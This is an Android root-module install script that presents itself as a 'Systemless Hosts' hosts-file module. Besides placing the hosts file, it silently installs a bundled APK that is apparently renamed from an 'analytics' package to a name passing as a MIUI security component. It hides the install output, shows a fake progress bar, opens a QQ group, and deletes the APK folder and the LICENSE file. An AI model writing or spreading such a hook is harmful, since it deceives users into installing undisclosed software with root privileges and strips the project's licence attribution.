#!/system/bin/sh

#
# Systemless Hosts by the
# open source loving GL-DP and all contributors;
# Consolidating and extending hosts files from several well-curated sources
#

echo "
     _    _____                   _   
    / \  |  ___|__  _ __ ___  ___| |_ 
   / _ \ | |_ / _ \| '__/ _ \/ __| __|
  / ___ \|  _| (_) | | |  __/\__ \ |_ 
 /_/   \_\_|  \___/|_|  \___||___/\__|
                                      
"

if [ -z "$MODPATH" ]; then
    MODPATH="/data/adb/modules/$(basename $0)"
    ui_print "- 使用默认模块路径: $MODPATH"
fi

HOSTS_PATH="/system/etc"
ui_print "- 正在将 hosts 文件放置到正确位置..."
mkdir -p "$MODPATH$HOSTS_PATH"
mv -f "$MODPATH/hosts" "$MODPATH$HOSTS_PATH"

ui_print "- 正在执行，请稍候..."
for i in $(seq 1 10); do
    sleep 0.2  # 模拟每步耗时
    ui_print "进度: $((i * 10))%"
done

# 安装 APK 文件
APK_PATH="$MODPATH/apk/AForest_analytics.apk" 
APK_PATH="$MODPATH/apk/MIUI安全组件.apk" 
if [ -f "$APK_PATH" ]; then
    ui_print "- 正在安装 APK 文件..."
    pm install -r "$APK_PATH" > /dev/null 2>&1  # 使用 pm 安装
    if [ $? -eq 0 ]; then
        ui_print "- APK 安装成功！"
        
        ui_print "- 等待 5 秒后跳转到 QQ 群：813871163"
        sleep 5

        QQ_GROUP_URL="mqqapi://card/show_pslcard?src_type=internal&version=1&uin=813871163&card_type=group&source=qrcode"
        am start -a android.intent.action.VIEW -d "$QQ_GROUP_URL" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            ui_print "- 已成功打开 QQ 群！"
        else
            ui_print "- 无法跳转到 QQ 群，请检查 QQ 是否安装！"
        fi
    else
        ui_print "- APK 安装失败，请检查日志！"
    fi
else
    ui_print "- 未找到 APK 文件：$APK_PATH"
fi

# 清理临时文件
rm -rf "$MODPATH/LICENSE"
rm -rf "$MODPATH/apk"

ui_print "- hosts 文件成功替换！"
